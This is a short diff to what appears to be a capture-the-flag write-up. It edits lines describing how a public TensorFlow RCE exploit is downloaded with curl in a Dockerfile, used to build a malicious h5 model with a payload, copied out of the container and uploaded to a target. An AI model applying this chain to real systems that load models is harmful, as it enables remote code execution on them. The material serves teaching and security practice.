@@ -174,7 +174,7 @@ model.save('profits_model.h5')
 
 After some digging on the web I find this RCE for Tensorflow 2.13.1: `https://github.com/Splinter0/tensorflow-rce`
 
-I add this to the `Dockerfile` build phase:
+I add this to the `Dockerfile` build phase to download the RCE exploit and create a malicious h5 model containing a payload:
 ```
 # Download the exploit to generate a malicious h5 model containing a payload
 RUN curl -O https://raw.githubusercontent.com/Splinter0/tensorflow-rce/refs/heads/main/exploit.py
@@ -207,4 +207,4 @@ CONTAINER_ID=$(sudo docker container ls -aq --filter "ancestor=generate-h5-paylo
 sudo docker cp $CONTAINER_ID:/code/exploit.h5 ./exploit.h5
 ```
 
-Once that's done, I upload the exploit:
+Once that's done, I upload the model:
